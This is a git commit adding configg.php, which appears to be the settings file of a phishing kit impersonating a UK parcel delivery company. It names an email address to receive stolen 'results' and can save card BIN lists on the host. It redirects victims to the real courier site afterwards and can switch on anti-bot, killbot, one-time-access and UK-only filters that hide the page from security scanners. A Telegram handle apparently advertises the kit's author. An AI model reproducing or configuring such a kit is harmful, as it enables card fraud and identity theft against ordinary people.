ce05d95583f39ef54b9caac25f455cacc6fbb7c8
bigchoppa419 <howesunia@gmail.com>
2024-06-26 04:03:33 +0100

    Add files via upload

---
+++ configg.php
@@ -0,0 +1,29 @@
+<?php
+error_reporting(0);
+// @Kr3pto on telegram
+$to = "cherrypickah72@gmail.com"; // your results email here
+$saveonhost = 0; // save a copy of results on host // 1 for enable and 0 for disable
+ 
+$save_binz = 1; // save binlist on host // 1 for enable and 0 for disable
+
+$ExitLink = "https://www.evri.com/";
+
+
+// some blockers
+$internal_antibot = 0;
+
+$One_Time_Access = 1; //1 for enable and 0 for disable
+
+
+$enable_killbot = 0; // this one uses killbot.org blocker // 1 to enable and 0 to disable
+$killbot_key = ''; // external blocker api key u get from here after u topup your balance https://killbot.org/developer [ required if killbot.org is enabled ]
+
+$external_antibot = 0; // this one uses antibot.pw blocker // 1 to enable and 0 to disable
+$apikey = ''; // external blocker api key u get from here after u topup your balance https://antibot.pw/dashboard/developers [ required if antibot.pw is enabled ]
+
+$mobile_lock = 0; // 1 to enable and 0 to disable
+$UK_lock = 0;  //1 for enable and 0 for disable
+
+$ask_sort_acc = 0;
+
+?>
